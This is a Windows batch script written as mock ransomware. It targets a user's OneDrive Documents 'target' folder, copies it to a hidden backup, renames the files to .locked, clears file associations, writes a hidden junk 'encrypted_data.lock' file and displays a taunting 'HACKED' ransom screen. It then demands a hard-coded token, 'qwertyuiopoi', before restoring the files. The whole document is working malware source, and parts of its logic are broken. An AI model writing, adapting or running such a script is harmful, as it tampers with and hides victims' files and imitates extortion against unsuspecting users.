@echo off
title Encrypted directory
color 0C

set "target_folder=%userprofile%\OneDrive\Dokumen\target"
set "backup_folder=%userprofile%\Videos\Backup_Encrypted"
set "output_file=%userprofile%\Videos\Backup_Encrypted\encrypted_data.lock"
set "dcrsystem=qwertyuiopoi" 
setlocal enabledelayedexpansion

REM 
if exist "%backup_folder%" (
echo ********************************************
echo Your all file in : "%target_folder%" has been encrypted and corrupted !
echo HAHAHAHAHAH HACKED !
echo You cant access all file now 
echo your directory has been injection of virus
echo This virus amzing its it?
echo ********************************************
echo. 

    goto token_prompt
)

REM 
mkdir "%backup_folder%"
xcopy /s /i "%target_folder%" "%backup_folder%" >nul

REM 
attrib +h +s "%backup_folder%"

REM
assoc .locked=
ftype lockedfile=

REM 
REM 
> "%output_file%" (
    for /r "%target_folder%" %%F in (*) do (
        echo [PROCESSING] %%F ==
        REM 
        echo File: %%F>>"%output_file%"
        
        REM 
        set "random_ext="
        for /l %%A in (1,1,8) do (
            set /a "rand=!random! %% 36"
            if !rand! lss 10 (
                set "random_ext=!random_ext!!rand!"
            ) else (
                set /a "rand=!rand! - 10 + 65"
                for %%B in (!rand!) do set "random_ext=!random_ext!!B!"
            )
        )
        
        REM 
        ren "%%F" "%%~nF.locked"
        
        REM 
        for /l %%C in (1,1,500) do (
            set /a "rand_content=!random! %% 36"
            if !rand_content! lss 10 (
                set "random_char=!rand_content!"
            ) else (
                set /a "rand_content=!rand_content! - 10 + 65"
                for %%D in (!rand_content!) do set "random_char=!random_char!!D!"
            )
            echo !random_char!>>"%output_file%"
        )
    )
)

REM 
attrib +h +s "%output_file%"
cls 
echo ********************************************
echo Your all file in : "%target_folder%" has been encrypted and corrupted !
echo HAHAHAHAHAHA HACKED !
echo You cant access all file now 
echo your directory has been injection of virus
echo This virus amzing its it?
echo ********************************************
echo. 
:token_prompt
set /p "input_token=Input Your Token: "

if "%input_token%"=="%dcrsystem%" (
    color a
    echo [SUCCESS] Token valid !

    REM
    for /r "%target_folder%" %%F in (*) do (
        del /f "%%F"
    )

    REM 
    echo [PROCESSING]
    echo [PROCESSING]
    echo [PROCESSING]
    echo [PROCESSING]
    echo [PROCESSING]
    echo [PROCESSING]
    xcopy /s /y "%backup_folder%\*" "%target_folder%" >nul

    REM 
    rmdir /s /q "%backup_folder%"

    REM 
    del /f "%output_file%"

    echo [SUCCESS]
    echo [SUCCESS]
    echo [SUCCESS]
    echo [SUCCESS]
    pause
) else (
    echo Token Wrong ! HAHAHAHAA.
    goto token_prompt
)

REM 
:session_continue
echo.
echo Not closed please click CTRL + C
pause >nul
goto session_continue
